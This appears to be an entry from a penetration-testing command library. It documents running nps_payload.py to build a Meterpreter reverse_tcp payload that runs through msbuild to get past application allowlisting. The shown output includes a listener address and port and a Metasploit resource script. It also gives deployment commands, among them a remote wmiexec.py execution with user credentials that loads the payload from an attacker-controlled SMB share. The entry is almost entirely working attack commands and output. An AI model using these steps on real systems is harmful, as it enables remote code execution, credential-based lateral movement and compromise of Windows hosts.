---
id: d0bf3279-d755-47cb-b6b7-743b00c9041b
name: nps payload Execute and Build
type: command
executor: bash
data: 'python2 nps_payload.py '
output: "root@kali:~/Documents/nps_payload# python nps_payload.py \n\n           \
  \                          (            (\n                              ) (   \
  \ )\\        )  )\\ )\n  (    `  )  (       `  )  ( /( )\\ )((_)(   ( /( (()/(\n\
  \  )\\ ) /(/(  )\\      /(/(  )(_)|()/( _  )\\  )(_)) ((_)\n _(_/(((_)_\\((_)  \
  \  ((_)_\\((_)_ )(_)) |((_)((_)_  _| |\n| ' \\)) '_ \\|_-<    | '_ \\) _` | || |\
  \ / _ \\/ _` / _` |\n|_||_|| .__//__/____| .__/\\__,_|\\_, |_\\___/\\__,_\\__,_|\n\
  \      |_|     |_____|_|         |__/\n\n                       v1.03\n\n\n    \
  \    (1)     Generate msbuild/nps/msf payload\n        (2)     Generate msbuild/nps/msf\
  \ HTA payload\n        (99)    Quit\n\nSelect a task: 1\n\nPayload Selection:\n\n\
  \        (1)     windows/meterpreter/reverse_tcp\n        (2)     windows/meterpreter/reverse_http\n\
  \        (3)     windows/meterpreter/reverse_https\n        (4)     Custom PS1 Payload\n\
  \nSelect payload: 1\nEnter Your Local IP Address (None): 10.10.10.100\nEnter the\
  \ listener port (443): 443\n[*] Generating PSH Payload...\n[*] Generating MSF Resource\
  \ Script...\n[+] Metasploit resource script written to msbuild_nps.rc\n[+] Payload\
  \ written to msbuild_nps.xml\n\n1. Run \"msfconsole -r msbuild_nps.rc\" to start\
  \ listener.\n2. Choose a Deployment Option (a or b): - See README.md for more information.\n\
  \  a. Local File Deployment:\n    - %windir%\\Microsoft.NET\\Framework\\v4.0.30319\\\
  msbuild.exe <folder_path_here>\\msbuild_nps.xml\n  b. Remote File Deployment:\n\
  \    - wmiexec.py <USER>:'<PASS>'@<RHOST> cmd.exe /c start %windir%\\Microsoft.NET\\\
  Framework\\v4.0.30319\\msbuild.exe \\\\<attackerip>\\<share>\\msbuild_nps.xml"
created_at: '2019-11-14T23:38:41.527393+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# nps payload Execute and Build

```bash
python2 nps_payload.py 
```

## Expected Output

```
root@kali:~/Documents/nps_payload# python nps_payload.py 

                                     (            (
                              ) (    )\        )  )\ )
  (    `  )  (       `  )  ( /( )\ )((_)(   ( /( (()/(
  )\ ) /(/(  )\      /(/(  )(_)|()/( _  )\  )(_)) ((_)
 _(_/(((_)_\((_)    ((_)_\((_)_ )(_)) |((_)((_)_  _| |
| ' \)) '_ \|_-<    | '_ \) _` | || | / _ \/ _` / _` |
|_||_|| .__//__/____| .__/\__,_|\_, |_\___/\__,_\__,_|
      |_|     |_____|_|         |__/

                       v1.03


        (1)     Generate msbuild/nps/msf payload
        (2)     Generate msbuild/nps/msf HTA payload
        (99)    Quit

Select a task: 1

Payload Selection:

        (1)     windows/meterpreter/reverse_tcp
        (2)     windows/meterpreter/reverse_http
        (3)     windows/meterpreter/reverse_https
        (4)     Custom PS1 Payload

Select payload: 1
Enter Your Local IP Address (None): 10.10.10.100
Enter the listener port (443): 443
[*] Generating PSH Payload...
[*] Generating MSF Resource Script...
[+] Metasploit resource script written to msbuild_nps.rc
[+] Payload written to msbuild_nps.xml

1. Run "msfconsole -r msbuild_nps.rc" to start listener.
2. Choose a Deployment Option (a or b): - See README.md for more information.
  a. Local File Deployment:
    - %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe <folder_path_here>\msbuild_nps.xml
  b. Remote File Deployment:
    - wmiexec.py <USER>:'<PASS>'@<RHOST> cmd.exe /c start %windir%\Microsoft.NET\Framework\v4.0.30319\msbuild.exe \\<attackerip>\<share>\msbuild_nps.xml
```


